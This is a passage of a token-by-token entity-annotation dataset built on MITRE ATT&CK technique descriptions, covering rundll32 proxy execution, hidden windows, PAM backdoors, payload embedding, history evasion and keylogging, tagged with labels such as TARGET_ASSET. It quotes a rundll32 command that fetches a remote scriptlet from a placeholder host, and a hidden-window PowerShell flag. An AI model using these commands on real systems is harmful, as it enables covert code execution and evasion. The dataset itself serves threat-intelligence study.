<code>%USERNAME%</code> O
and O
<code>$USER</code> O
, O
may O
also O
be O
used O
to O
access O
this O
information O
. O 


On O
network B-TARGET_ASSET
devices I-TARGET_ASSET
, O
[Network B-TARGET_ASSET
Device I-TARGET_ASSET
CLI](https://attack.mitre.org/techniques/T1059/008) I-TARGET_ASSET
commands O
such O
as O
`show O
users` O
and O
`show O
ssh` O
can O
be O
used O
to O
display O
users O
currently O
logged O
into O
the O
device B-TARGET_ASSET
. O 

(Citation: O
show_ssh_users_cmd_cisco)(Citation: O
US-CERT O
TA18-106A O
Network O
Infrastructure O
Devices O
2018) O

Adversaries O
may O
buy O
, O
lease O
, O
rent O
, O
or O
obtain O
infrastructure B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 


A O
wide O
variety O
of O
infrastructure B-TARGET_ASSET
exists O
for O
hosting O
and O
orchestrating O
adversary O
operations O
. O 


Infrastructure B-TARGET_ASSET
solutions I-TARGET_ASSET
include O
physical O
or O
cloud O
servers B-TARGET_ASSET
, O
domains B-TARGET_ASSET
, O
and O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
. O 

(Citation: O
TrendmicroHideoutsLease) O
Some O
infrastructure B-TARGET_ASSET
providers I-TARGET_ASSET
offer O
free B-PRECON
trial I-PRECON
periods I-PRECON
, O
enabling O
infrastructure B-TARGET_ASSET
acquisition O
at O
limited O
to O
no O
cost O
. O 

(Citation: O
Free O
Trial O
PurpleUrchin) O
Additionally O
, O
botnets B-TARGET_ASSET
are O
available O
for O
rent O
or O
purchase O
. O 


Use O
of O
these O
infrastructure B-TARGET_ASSET
solutions I-TARGET_ASSET
allows O
adversaries O
to O
stage O
, O
launch O
, O
and O
execute O
operations O
. O 


Solutions O
may O
help O
adversary O
operations O
blend O
in O
with O
traffic O
that O
is O
seen O
as O
normal O
, O
such O
as O
contacting O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
or O
acquiring O
infrastructure B-TARGET_ASSET
to O
support O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
, O
including O
from O
residential O
proxy B-TARGET_ASSET
services I-TARGET_ASSET
. O 


(Citation: O
amnesty_nso_pegasus)(Citation: O
FBI O
Proxies O
Credential O
Stuffing)(Citation: O
Mandiant O
APT29 O
Microsoft O
365 O
2022) O
Depending O
on O
the O
implementation O
, O
adversaries O
may O
use O
infrastructure B-TARGET_ASSET
that O
makes O
it O
difficult O
to O
physically O
tie O
back O
to O
them O
as O
well O
as O
utilize O
infrastructure B-TARGET_ASSET
that O
can O
be O
rapidly B-PRECON
provisioned I-PRECON
, O
modified B-PRECON
, O
and O
shut B-PRECON
down I-PRECON
. O 


Adversaries O
may O
abuse O
rundll32.exe B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
code O
. O 


Using O
rundll32.exe B-TARGET_ASSET
, O
vice O
executing O
directly O
(i.e. O 

[Shared B-TARGET_ASSET
Modules](https://attack.mitre.org/techniques/T1129) I-TARGET_ASSET
) O
, O
may O
avoid O
triggering O
security B-TARGET_ASSET
tools I-TARGET_ASSET
that O
may O
not O
monitor O
execution O
of O
the O
rundll32.exe B-TARGET_ASSET
process I-TARGET_ASSET
because O
of O
allowlists O
or O
false O
positives O
from O
normal O
operations O
. O 

Rundll32.exe B-TARGET_ASSET
is O
commonly O
associated O
with O
executing O
DLL B-TARGET_ASSET
payloads I-TARGET_ASSET
(ex: O
<code>rundll32.exe O
{DLLname, O
DLLfunction}</code>) O
. O 


Rundll32.exe B-TARGET_ASSET
can O
also O
be O
used O
to O
execute O
[Control B-TARGET_ASSET
Panel](https://attack.mitre.org/techniques/T1218/002) I-TARGET_ASSET
Item I-TARGET_ASSET
files I-TARGET_ASSET
( I-TARGET_ASSET
.cpl I-TARGET_ASSET
) I-TARGET_ASSET
through O
the O
undocumented B-PRECON
shell32.dll B-TARGET_ASSET
functions I-TARGET_ASSET
<code>Control_RunDLL</code> O
and O
<code>Control_RunDLLAsUser</code> O
. O 


Double-clicking O
a O
.cpl B-TARGET_ASSET
file I-TARGET_ASSET
also O
causes O
rundll32.exe B-TARGET_ASSET
to O
execute O
. O 

(Citation: O
Trend O
Micro O
CPL) O
For O
example O
, O
[ClickOnce](https://attack.mitre.org/techniques/T1127/002) O
can O
be O
proxied O
through O
Rundll32.exe B-TARGET_ASSET
. O 


Rundll32 O
can O
also O
be O
used O
to O
execute O
scripts B-TARGET_ASSET
such O
as O
JavaScript B-TARGET_ASSET
. O 


This O
can O
be O
done O
using O
a O
syntax O
similar O
to O
this: O
<code>rundll32.exe O
javascript:""\..\mshtml,RunHTMLApplication O
"";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> O
This O
behavior O
has O
been O
seen O
used O
by O
malware O
such O
as O
Poweliks O
. O 

(Citation: O
This O
is O
Security O
Command O
Line O
Confusion) O

Adversaries O
may O
also O
attempt O
to O
obscure O
malicious O
code O
from O
analysis O
by O
abusing O
the O
manner O
in O
which O
rundll32.exe B-TARGET_ASSET
loads O
DLL B-TARGET_ASSET
function I-TARGET_ASSET
names I-TARGET_ASSET
. O 


As O
part O
of O
Windows O
compatibility O
support O
for O
various O
character O
sets O
, O
rundll32.exe B-TARGET_ASSET
will O
first O
check O
for O
wide/Unicode O
then O
ANSI O
character-supported O
functions O
before O
loading O
the O
specified O
function O
(e.g., O
given O
the O
command O
<code>rundll32.exe O
ExampleDLL.dll, O
ExampleFunction</code> O
, O
rundll32.exe B-TARGET_ASSET
would O
first O
attempt O
to O
execute O
<code>ExampleFunctionW</code> O
, O
or O
failing O
that O
<code>ExampleFunctionA</code> O
, O
before O
loading O
<code>ExampleFunction</code>) O
. O 


Adversaries O
may O
therefore O
obscure O
malicious O
code O
by O
creating O
multiple O
identical O
exported O
function B-TARGET_ASSET
names I-TARGET_ASSET
and O
appending O
<code>W</code> O
and/or O
<code>A</code> O
to O
harmless O
ones O
. O 


(Citation: O
Attackify O
Rundll32.exe O
Obscurity)(Citation: O
Github O
NoRunDll) O
DLL B-TARGET_ASSET
functions I-TARGET_ASSET
can O
also O
be O
exported O
and O
executed O
by O
an O
ordinal O
number O
(ex: O
<code>rundll32.exe O
file.dll,#1</code>) O
. O 


Additionally O
, O
adversaries O
may O
use O
[Masquerading](https://attack.mitre.org/techniques/T1036) O
techniques O
(such O
as O
changing O
DLL O
file O
names O
, O
file O
extensions O
, O
or O
function O
names) O
to O
further O
conceal O
execution O
of O
a O
malicious O
payload O
. O 

(Citation: O
rundll32.exe O
defense O
evasion) O

Adversaries O
may O
attempt O
to O
discover O
containers B-TARGET_ASSET
and O
other O
resources O
that O
are O
available O
within O
a O
containers B-TARGET_ASSET
environment I-TARGET_ASSET
. O 


Other O
resources O
may O
include O
images B-TARGET_ASSET
, O
deployments B-TARGET_ASSET
, O
pods B-TARGET_ASSET
, O
nodes B-TARGET_ASSET
, O
and O
other O
information O
such O
as O
the O
status O
of O
a O
cluster B-TARGET_ASSET
. O 


These O
resources O
can O
be O
viewed O
within O
web B-TARGET_ASSET
applications I-TARGET_ASSET
such O
as O
the O
Kubernetes B-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
can O
be O
queried O
via O
the O
Docker B-TARGET_ASSET
and O
Kubernetes B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 


(Citation: O
Docker O
API)(Citation: O
Kubernetes O
API) O
In O
Docker O
, O
logs B-TARGET_ASSET
may O
leak O
information O
about O
the O
environment O
, O
such O
as O
the O
environment’s O
configuration O
, O
which O
services O
are O
available O
, O
and O
what O
cloud O
provider O
the O
victim O
may O
be O
utilizing O
. O 


The O
discovery O
of O
these O
resources O
may O
inform O
an O
adversary’s O
next O
steps O
in O
the O
environment O
, O
such O
as O
how O
to O
perform O
lateral O
movement O
and O
which O
methods O
to O
utilize O
for O
execution O
. O 


Adversaries O
may O
purchase O
and O
configure O
serverless B-TARGET_ASSET
cloud I-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
such O
as O
Cloudflare B-TARGET_ASSET
Workers I-TARGET_ASSET
, O
AWS B-TARGET_ASSET
Lambda I-TARGET_ASSET
functions I-TARGET_ASSET
, O
or O
Google B-TARGET_ASSET
Apps I-TARGET_ASSET
Scripts I-TARGET_ASSET
, O
that O
can O
be O
used O
during O
targeting O
. O 


By O
utilizing O
serverless B-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
adversaries O
can O
make O
it O
more O
difficult O
to O
attribute O
infrastructure B-TARGET_ASSET
used O
during O
operations O
back O
to O
them O
. O 


Once O
acquired B-PRECON
, O
the O
serverless B-TARGET_ASSET
runtime I-TARGET_ASSET
environment I-TARGET_ASSET
can O
be O
leveraged O
to O
either O
respond O
directly O
to O
infected O
machines O
or O
to O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
traffic I-TARGET_ASSET
to O
an O
adversary-owned O
command O
and O
control O
server B-TARGET_ASSET
. O 


(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers)(Citation: O
AWS O
Lambda O
Redirector)(Citation: O
GWS O
Apps O
Script O
Abuse O
2021) O
As O
traffic O
generated O
by O
these O
functions O
will O
appear O
to O
come O
from O
subdomains O
of O
common O
cloud O
providers O
, O
it O
may O
be O
difficult O
to O
distinguish O
from O
ordinary O
traffic O
to O
these O
providers O
- O
making O
it O
easier O
to O
[Hide O
Infrastructure](https://attack.mitre.org/techniques/T1665) O
. O 

(Citation: O
Detecting O
Command O
& O
Control O
in O
the O
Cloud)(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers) O

Adversaries O
may O
implement O
hidden B-PRECON
windows B-TARGET_ASSET
to O
conceal O
malicious O
activity O
from O
the O
plain O
sight O
of O
users O
. O 


In O
some O
cases O
, O
windows B-TARGET_ASSET
that O
would O
typically O
be O
displayed O
when O
an O
application B-TARGET_ASSET
carries O
out O
an O
operation O
can O
be O
hidden B-PRECON
. O 


This O
may O
be O
utilized O
by O
system O
administrators O
to O
avoid O
disrupting O
user O
work O
environments O
when O
carrying O
out O
administrative O
tasks O
. O 


Adversaries O
may O
abuse O
operating B-TARGET_ASSET
system I-TARGET_ASSET
functionality O
to O
hide O
otherwise O
visible O
windows B-TARGET_ASSET
from O
users O
so O
as O
not O
to O
alert O
the O
user O
to O
adversary O
activity O
on O
the O
system B-TARGET_ASSET
. O 


### O
Windows O
There O
are O
a O
variety O
of O
features O
in O
scripting B-TARGET_ASSET
languages I-TARGET_ASSET
in O
Windows O
, O
such O
as O
[PowerShell](https://attack.mitre.org/techniques/T1086) B-TARGET_ASSET
, O
Jscript B-TARGET_ASSET
, O
and O
VBScript B-TARGET_ASSET
to O
make O
windows B-TARGET_ASSET
hidden B-PRECON
. O 


One O
example O
of O
this O
is O
<code>powershell.exe O
-WindowStyle O
Hidden</code> O
. O 

(Citation: O
PowerShell O
About O
2019) O

### O
Mac O
The O
configurations O
for O
how O
applications B-TARGET_ASSET
run O
on O
macOS O
are O
listed O
in O
property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
. O 


One O
of O
the O
tags O
in O
these O
files B-TARGET_ASSET
can O
be O
<code>apple.awt.UIElement</code> O
, O
which O
allows O
for O
Java O
applications B-TARGET_ASSET
to O
prevent O
the O
application's B-TARGET_ASSET
icon I-TARGET_ASSET
from O
appearing O
in O
the O
Dock B-TARGET_ASSET
. O 


A O
common O
use O
for O
this O
is O
when O
applications B-TARGET_ASSET
run O
in O
the O
system B-TARGET_ASSET
tray I-TARGET_ASSET
, O
but O
don't O
also O
want O
to O
show O
up O
in O
the O
Dock B-TARGET_ASSET
. O 


However O
, O
adversaries O
can O
abuse O
this O
feature O
and O
hide O
their O
running O
window B-TARGET_ASSET
. O 

(Citation: O
Antiquated O
Mac O
Malware) O

Mach-O B-TARGET_ASSET
binaries I-TARGET_ASSET
have O
a O
series O
of O
headers B-TARGET_ASSET
that O
are O
used O
to O
perform O
certain O
operations O
when O
a O
binary B-TARGET_ASSET
is O
loaded O
. O 


The O
LC_LOAD_DYLIB B-TARGET_ASSET
header I-TARGET_ASSET
in O
a O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
tells O
macOS O
and O
OS O
X O
which O
dynamic B-TARGET_ASSET
libraries I-TARGET_ASSET
( I-TARGET_ASSET
dylibs I-TARGET_ASSET
) O
to O
load O
during O
execution O
time O
. O 


These O
can O
be O
added O
ad-hoc O
to O
the O
compiled O
binary B-TARGET_ASSET
as O
long O
adjustments O
are O
made O
to O
the O
rest O
of O
the O
fields O
and O
dependencies O
(Citation: O
Writing O
Bad O
Malware O
for O
OSX) O
. O 


There O
are O
tools O
available O
to O
perform O
these O
changes O
. O 


Any O
changes O
will O
invalidate O
digital O
signatures O
on O
binaries B-TARGET_ASSET
because O
the O
binary B-TARGET_ASSET
is O
being O
modified B-PRECON
. O 


Adversaries O
can O
remediate O
this O
issue O
by O
simply O
removing O
the O
LC_CODE_SIGNATURE B-TARGET_ASSET
command I-TARGET_ASSET
from O
the O
binary B-TARGET_ASSET
so O
that O
the O
signature O
isn’t O
checked O
at O
load O
time O
(Citation: O
Malware O
Persistence O
on O
OS O
X) O
. O 


Adversaries O
may O
encode O
data B-TARGET_ASSET
with O
a O
standard O
data O
encoding O
system O
to O
make O
the O
content O
of O
command O
and O
control O
traffic B-TARGET_ASSET
more O
difficult O
to O
detect O
. O 


Command O
and O
control O
(C2) O
information B-TARGET_ASSET
can O
be O
encoded O
using O
a O
standard O
data O
encoding O
system O
that O
adheres O
to O
existing O
protocol B-TARGET_ASSET
specifications I-TARGET_ASSET
. O 


Common O
data O
encoding O
schemes O
include O
ASCII O
, O
Unicode O
, O
hexadecimal O
, O
Base64 O
, O
and O
MIME O
. O 


(Citation: O
Wikipedia O
Binary-to-text O
Encoding)(Citation: O
Wikipedia O
Character O
Encoding) O
Some O
data O
encoding O
systems O
may O
also O
result O
in O
data O
compression O
, O
such O
as O
gzip O
. O 


Adversaries O
may O
embed O
payloads B-TARGET_ASSET
within O
other O
files B-TARGET_ASSET
to O
conceal O
malicious O
content O
from O
defenses O
. O 


Otherwise O
seemingly O
benign O
files B-TARGET_ASSET
(such O
as O
scripts B-TARGET_ASSET
and O
executables B-TARGET_ASSET
) O
may O
be O
abused O
to O
carry O
and O
obfuscate O
malicious O
payloads B-TARGET_ASSET
and O
content O
. O 


In O
some O
cases O
, O
embedded B-PRECON
payloads B-TARGET_ASSET
may O
also O
enable O
adversaries O
to O
[Subvert O
Trust O
Controls](https://attack.mitre.org/techniques/T1553) O
by O
not O
impacting O
execution O
controls O
such O
as O
digital O
signatures O
and O
notarization O
tickets O
. O 

(Citation: O
Sentinel O
Labs) O

Adversaries O
may O
embed O
payloads B-TARGET_ASSET
in O
various O
file B-TARGET_ASSET
formats I-TARGET_ASSET
to O
hide O
payloads B-TARGET_ASSET
. O 


(Citation: O
Microsoft O
Learn) O
This O
is O
similar O
to O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
though O
does O
not O
involve O
weaving O
malicious O
content O
into O
specific O
bytes O
and O
patterns O
related O
to O
legitimate O
digital O
media O
formats O
. O 

(Citation: O
GitHub O
PSImage) O

For O
example O
, O
adversaries O
have O
been O
observed O
embedding O
payloads B-TARGET_ASSET
within O
or O
as O
an O
overlay O
of O
an O
otherwise O
benign O
binary B-TARGET_ASSET
. O 

(Citation: O
Securelist O
Dtrack2) O
Adversaries O
have O
also O
been O
observed O
nesting O
payloads B-TARGET_ASSET
(such O
as O
executables B-TARGET_ASSET
and O
run-only O
scripts B-TARGET_ASSET
) O
inside O
a O
file B-TARGET_ASSET
of O
the O
same O
format O
. O 

(Citation: O
SentinelLabs O
reversing O
run-only O
applescripts O
2021) O

Embedded B-PRECON
content B-TARGET_ASSET
may O
also O
be O
used O
as O
[Process O
Injection](https://attack.mitre.org/techniques/T1055) O
payloads B-TARGET_ASSET
used O
to O
infect O
benign O
system B-TARGET_ASSET
processes I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro) O
These O
embedded B-PRECON
then O
injected O
payloads B-TARGET_ASSET
may O
be O
used O
as O
part O
of O
the O
modules B-TARGET_ASSET
of O
malware B-TARGET_ASSET
designed O
to O
provide O
specific O
features O
such O
as O
encrypting O
C2 O
communications O
in O
support O
of O
an O
orchestrator O
module O
. O 


For O
example O
, O
an O
embedded B-TARGET_ASSET
module I-TARGET_ASSET
may O
be O
injected O
into O
default O
browsers B-TARGET_ASSET
, O
allowing O
adversaries O
to O
then O
communicate O
via O
the O
network B-TARGET_ASSET
. O 

(Citation: O
Malware O
Analysis O
Report O
ComRAT) O

Property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
contain O
all O
of O
the O
information O
that O
macOS O
and O
OS O
X O
uses O
to O
configure O
applications B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 


These O
files B-TARGET_ASSET
are O
UTF-8 B-PRECON
encoded I-PRECON
and O
formatted B-PRECON
like I-PRECON
XML I-PRECON
documents I-PRECON
via O
a O
series O
of O
keys O
surrounded O
by O
< O
> O
. O 


They O
detail O
when O
programs O
should O
execute O
, O
file O
paths O
to O
the O
executables O
, O
program O
arguments O
, O
required O
OS O
permissions O
, O
and O
many O
others O
. O 

plists B-TARGET_ASSET
are O
located O
in O
certain O
locations O
depending O
on O
their O
purpose O
such O
as O
<code>/Library/Preferences</code> O
(which O
execute O
with O
elevated O
privileges) O
and O
<code>~/Library/Preferences</code> O
(which O
execute O
with O
a O
user's O
privileges) O
. O 


Adversaries O
can O
modify O
these O
plist B-TARGET_ASSET
files I-TARGET_ASSET
to O
point O
to O
their O
own O
code O
, O
can O
use O
them O
to O
execute O
their O
code O
in O
the O
context O
of O
another O
user O
, O
bypass O
whitelisting O
procedures O
, O
or O
even O
use O
them O
as O
a O
persistence O
mechanism O
. O 

(Citation: O
Sofacy O
Komplex O
Trojan) O

Adversaries O
may O
modify O
pluggable B-TARGET_ASSET
authentication I-TARGET_ASSET
modules I-TARGET_ASSET
( I-TARGET_ASSET
PAM I-TARGET_ASSET
) I-TARGET_ASSET
to O
access O
user O
credentials B-TARGET_ASSET
or O
enable O
otherwise O
unwarranted O
access O
to O
accounts O
. O 


PAM B-TARGET_ASSET
is O
a O
modular O
system O
of O
configuration B-TARGET_ASSET
files I-TARGET_ASSET
, O
libraries B-TARGET_ASSET
, O
and O
executable B-TARGET_ASSET
files I-TARGET_ASSET
which O
guide O
authentication O
for O
many O
services B-TARGET_ASSET
. O 


The O
most O
common O
authentication B-TARGET_ASSET
module I-TARGET_ASSET
is O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
which O
retrieves O
, O
sets O
, O
and O
verifies O
account O
authentication O
information O
in O
<code>/etc/passwd</code> B-TARGET_ASSET
and O
<code>/etc/shadow</code> B-TARGET_ASSET
. O 

(Citation: O
Apple O
PAM)(Citation: O
Man O
Pam_Unix)(Citation: O
Red O
Hat O
PAM) O

Adversaries O
may O
modify O
components O
of O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
to O
create O
backdoors O
. O 


PAM B-TARGET_ASSET
components I-TARGET_ASSET
, O
such O
as O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
can O
be O
patched B-PRECON
to O
accept O
arbitrary O
adversary O
supplied O
values O
as O
legitimate O
credentials O
. O 

(Citation: O
PAM O
Backdoor) O

Malicious O
modifications O
to O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
may O
also O
be O
abused O
to O
steal O
credentials B-TARGET_ASSET
. O 


Adversaries O
may O
infect O
PAM B-TARGET_ASSET
resources I-TARGET_ASSET
with O
code O
to O
harvest O
user O
credentials B-TARGET_ASSET
, O
since O
the O
values O
exchanged O
with O
PAM B-TARGET_ASSET
components I-TARGET_ASSET
may O
be O
plain-text B-PRECON
since O
PAM B-TARGET_ASSET
does O
not O
store O
passwords O
. O 

(Citation: O
PAM O
Creds)(Citation: O
Apple O
PAM) O

An O
adversary O
may O
revert O
changes O
made O
to O
a O
cloud B-TARGET_ASSET
instance I-TARGET_ASSET
after O
they O
have O
performed O
malicious O
activities O
in O
attempt O
to O
evade O
detection O
and O
remove O
evidence O
of O
their O
presence O
. O 

In O
highly O
virtualized O
environments O
, O
such O
as O
cloud-based O
infrastructure B-TARGET_ASSET
, O
this O
may O
be O
accomplished O
by O
restoring O
virtual B-TARGET_ASSET
machine I-TARGET_ASSET
( I-TARGET_ASSET
VM I-TARGET_ASSET
) I-TARGET_ASSET
or O
data B-TARGET_ASSET
storage I-TARGET_ASSET
snapshots I-TARGET_ASSET
through O
the O
cloud B-TARGET_ASSET
management I-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
cloud B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 


Another O
variation O
of O
this O
technique O
is O
to O
utilize O
temporary B-TARGET_ASSET
storage I-TARGET_ASSET
attached B-PRECON
to O
the O
compute B-TARGET_ASSET
instance I-TARGET_ASSET
. O 

Most O
cloud O
providers O
provide O
various O
types O
of O
storage B-TARGET_ASSET
including O
persistent O
, O
local O
, O
and/or O
ephemeral B-PRECON
, O
with O
the O
ephemeral O
types O
often O
reset B-PRECON
upon I-PRECON
stop/restart I-PRECON
of I-PRECON
the I-PRECON
VM B-TARGET_ASSET
. O 

(Citation: O
Tech O
Republic O
- O
Restore O
AWS O
Snapshots)(Citation: O
Google O
- O
Restore O
Cloud O
Snapshot) O

The O
<code>HISTCONTROL</code> B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
keeps O
track O
of O
what O
should O
be O
saved O
by O
the O
<code>history</code> O
command O
and O
eventually O
into O
the O
<code>~/.bash_history</code> B-TARGET_ASSET
file I-TARGET_ASSET
when O
a O
user O
logs O
out O
. O 

This O
setting O
can O
be O
configured B-PRECON
to O
ignore O
commands O
that O
start O
with O
a O
space O
by O
simply O
setting O
it O
to O
""ignorespace"" O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
can O
also O
be O
set O
to O
ignore O
duplicate O
commands O
by O
setting O
it O
to O
""ignoredups"" O
. O 

In O
some O
Linux O
systems O
, O
this O
is O
set B-PRECON
by I-PRECON
default I-PRECON
to I-PRECON
""ignoreboth"" I-PRECON
which O
covers O
both O
of O
the O
previous O
examples O
. O 

This O
means O
that O
“ O
ls” O
will O
not O
be O
saved O
, O
but O
“ls” O
would O
be O
saved O
by O
history O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
does O
not O
exist B-PRECON
by I-PRECON
default I-PRECON
on O
macOS O
, O
but O
can O
be O
set O
by O
the O
user O
and O
will O
be O
respected O
. O 

Adversaries O
can O
use O
this O
to O
operate O
without O
leaving O
traces O
by O
simply O
prepending O
a O
space O
to O
all O
of O
their O
terminal O
commands O
. O 


Adversaries O
may O
gather O
information O
about O
the O
victim's O
hosts B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
hosts B-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
including O
administrative O
data O
(ex: O
name O
, O
assigned O
IP O
, O
functionality O
, O
etc.) O
as O
well O
as O
specifics O
regarding O
its O
configuration O
(ex: O
operating O
system O
, O
language O
, O
etc.) O
. O 


Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 

Adversaries O
may O
also O
compromise O
sites B-TARGET_ASSET
then O
include O
malicious O
content O
designed O
to O
collect O
host B-TARGET_ASSET
information I-TARGET_ASSET
from O
visitors O
. O 

(Citation: O
ATT O
ScanBox) O
Information O
about O
hosts B-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Social O
Media](https://attack.mitre.org/techniques/T1593/001) O
or O
[Search O
Victim-Owned O
Websites](https://attack.mitre.org/techniques/T1594)) O
. O 

Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593) O
or O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[Supply O
Chain O
Compromise](https://attack.mitre.org/techniques/T1195) O
or O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
also O
gather O
victim O
host B-TARGET_ASSET
information I-TARGET_ASSET
via O
User-Agent B-TARGET_ASSET
HTTP I-TARGET_ASSET
headers I-TARGET_ASSET
, O
which O
are O
sent O
to O
a O
server B-TARGET_ASSET
to O
identify O
the O
application B-TARGET_ASSET
, O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
vendor O
, O
and/or O
version O
of O
the O
requesting O
user O
agent O
. O 

This O
can O
be O
used O
to O
inform O
the O
adversary’s O
follow-on O
action O
. O 

For O
example O
, O
adversaries O
may O
check O
user O
agents O
for O
the O
requesting O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
then O
only O
serve O
malware B-TARGET_ASSET
for O
target O
operating B-TARGET_ASSET
systems I-TARGET_ASSET
while O
ignoring O
others O
. O 

(Citation: O
TrellixQakbot) O

Adversaries O
may O
search O
public O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
for O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 

Digital B-TARGET_ASSET
certificates I-TARGET_ASSET
are O
issued O
by O
a O
certificate O
authority O
(CA) O
in O
order O
to O
cryptographically O
verify O
the O
origin O
of O
signed O
content O
. O 

These O
certificates B-TARGET_ASSET
, O
such O
as O
those O
used O
for O
encrypted O
web O
traffic B-TARGET_ASSET
(HTTPS O
SSL/TLS O
communications O
) O
, O
contain O
information O
about O
the O
registered O
organization O
such O
as O
name O
and O
location O
. O 

Adversaries O
may O
search O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
to O
gather O
actionable O
information O
. O 

Threat O
actors O
can O
use O
online O
resources O
and O
lookup O
tools O
to O
harvest O
information O
about O
certificates B-TARGET_ASSET
. O 

(Citation: O
SSLShopper O
Lookup) O
Digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
may O
also O
be O
available B-PRECON
from O
artifacts B-TARGET_ASSET
signed B-PRECON
by I-PRECON
the I-PRECON
organization I-PRECON
(ex: O
certificates B-TARGET_ASSET
used O
from O
encrypted O
web O
traffic B-TARGET_ASSET
are O
served O
with O
content O
) O
. O 

(Citation: O
Medium O
SSL O
Cert) O
Information O
from O
these O
sources O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133) O
or O
[Trusted O
Relationship](https://attack.mitre.org/techniques/T1199)) O
. O 


Adversaries O
may O
log O
user O
keystrokes B-TARGET_ASSET
to O
intercept O
credentials B-TARGET_ASSET
as O
the O
user O
types O
them O
. O 

Keylogging O
is O
likely O
to O
be O
used O
to O
acquire O
credentials B-TARGET_ASSET
for O
new O
access O
opportunities O
when O
[OS B-TARGET_ASSET
Credential I-TARGET_ASSET
Dumping](https://attack.mitre.org/techniques/T1003) I-TARGET_ASSET
efforts O
are O
not O
effective O
, O
and O
may O
require O
an O
adversary O
to O
intercept O
keystrokes B-TARGET_ASSET
on O
a O
system B-TARGET_ASSET
for O
a O
substantial O
period O
of O
time O
before O
credentials B-TARGET_ASSET
can O
be O
successfully O
captured O
. O 

In O
order O
to O
increase O
the O
likelihood O
of O
capturing O
credentials B-TARGET_ASSET
quickly O
, O
an O
adversary O
may O
also O
perform O
actions O
such O
as O
clearing O
browser B-TARGET_ASSET
cookies I-TARGET_ASSET
to O
force O
users O
to O
reauthenticate O
to O
systems O
. O 

(Citation: O
Talos O
Kimsuky O
Nov O
2021) O

Keylogging O
is O
the O
most O
prevalent O
type O
of O
input O
capture O
, O
with O
many O
different O
ways O
of O
intercepting O
keystrokes B-TARGET_ASSET
. O 

(Citation: O
Adventures O
of O
a O
Keystroke) O
Some O
methods O
include O
: O

* O
Hooking O
API B-TARGET_ASSET
callbacks I-TARGET_ASSET
used O
for O
processing O
keystrokes B-TARGET_ASSET
. O 

Unlike O
[Credential B-TARGET_ASSET
API I-TARGET_ASSET
Hooking](https://attack.mitre.org/techniques/T1056/004) I-TARGET_ASSET
, O
this O
focuses O
solely O
on O
API B-TARGET_ASSET
functions I-TARGET_ASSET
intended O
for O
processing O
keystroke B-TARGET_ASSET
data I-TARGET_ASSET
. O 

* O
Reading O
raw O
keystroke B-TARGET_ASSET
data I-TARGET_ASSET
from O
the O
hardware B-TARGET_ASSET
buffer I-TARGET_ASSET
. O 

* O
Windows B-TARGET_ASSET
Registry I-TARGET_ASSET
modifications O
. O 

* O
Custom O
drivers B-TARGET_ASSET
. O 

* O
[Modify O
System O
Image](https://attack.mitre.org/techniques/T1601) O
may O
provide O
adversaries O
with O
hooks O
into O
the O
